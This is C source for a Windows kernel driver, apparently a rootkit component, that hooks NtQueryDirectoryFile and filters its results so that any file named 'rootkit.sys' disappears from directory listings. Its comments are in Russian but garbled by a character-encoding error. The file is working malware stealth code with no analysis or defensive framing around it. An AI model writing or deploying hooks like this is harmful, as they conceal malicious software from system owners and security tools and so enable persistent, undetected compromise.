#include <ntifs.h>
#include "files.h"

#pragma warning(disable : 4996)
//-----------------------------------------------

NT_QUERY_DIRECTORY_FILE glRealNtQueryDirectoryFile;

//-----------------------------------------------

//-----------------------------------------------

//
// ¬спомогательный макрос, осуществл€ющий единообразную фильтрацию в запросах
// к каталогам с разными структурами (все структуры содержат одинаковые пол€,
// необходимые дл€ фильтрации).
//
#define FILTER_LIST_DIR(EntryType, listDirBuffer, listDirSize, newListDirLength)   \
    {\
        EntryType *currentEntry = (EntryType*) listDirBuffer;\
        EntryType *lastEntry = NULL;\
        PCHAR copyPosition = (PCHAR) listDirBuffer;\
        while (TRUE) {\
            ULONG_PTR offset = currentEntry->NextEntryOffset;\
            ULONG_PTR copySize;\
            if (offset == 0) {\
                copySize = listDirSize - (copyPosition - listDirBuffer);\
            }\
            else {\
                copySize = offset;\
            }\
    \
            \
		    if (!wcsncmp(currentEntry->FileName, L"rootkit.sys", currentEntry->FileNameLength / 2)) {\
		    \
                newListDirLength -= copySize;\
                if ( (currentEntry->NextEntryOffset == 0) && (lastEntry != NULL) ) {\
                    lastEntry->NextEntryOffset = 0;\
                }\
            }\
            else {\
		    \
                if (copyPosition != (PCHAR)currentEntry) {\
                    RtlCopyMemory (copyPosition, currentEntry, copySize);\
                }\
                lastEntry = currentEntry;\
                copyPosition += copySize;\
            }\
    \
            if (offset == 0) {\
                break;\
            }\
    \
            currentEntry = (EntryType*)((PCHAR)currentEntry + offset);\
        }\
    }

NTSTATUS HookNtQueryDirectoryFile(
	HANDLE FileHandle, 
	HANDLE Event, 
	PIO_APC_ROUTINE ApcRoutine, 
	PVOID ApcContext, 
	PIO_STATUS_BLOCK IoStatusBlock, 
	PVOID FileInformation, 
	ULONG Length, 
	FILE_INFORMATION_CLASS FileInformationClass, 
	BOOLEAN ReturnSingleEntry, 
	PUNICODE_STRING FileName, 
	BOOLEAN RestartScan
) {
	
	NTSTATUS retStatus;
    PCHAR listDirBuffer;
    ULONG_PTR newListDirLength;

	InterlockedAdd(&((LONG)glHookCount), 1);

	retStatus = glRealNtQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);

    if (NT_SUCCESS(retStatus)) {

        listDirBuffer = FileInformation;
        newListDirLength = IoStatusBlock->Information;

        __try {
            switch (FileInformationClass) {
            case FileDirectoryInformation:
                FILTER_LIST_DIR(FILE_DIRECTORY_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
                break;
            case FileFullDirectoryInformation:
                FILTER_LIST_DIR(FILE_FULL_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
                break;
            case FileBothDirectoryInformation:
                FILTER_LIST_DIR(FILE_BOTH_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
                break;
            case FileNamesInformation:
                FILTER_LIST_DIR(FILE_NAMES_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
                break;
            case FileIdBothDirectoryInformation:
                FILTER_LIST_DIR(FILE_ID_BOTH_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
                break;
            case FileIdFullDirectoryInformation:
                FILTER_LIST_DIR(FILE_ID_FULL_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
                break;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }

        IoStatusBlock->Information = newListDirLength;

    }

	InterlockedAdd(&((LONG)glHookCount), -1);

	return retStatus;
}

//-----------------------------------------------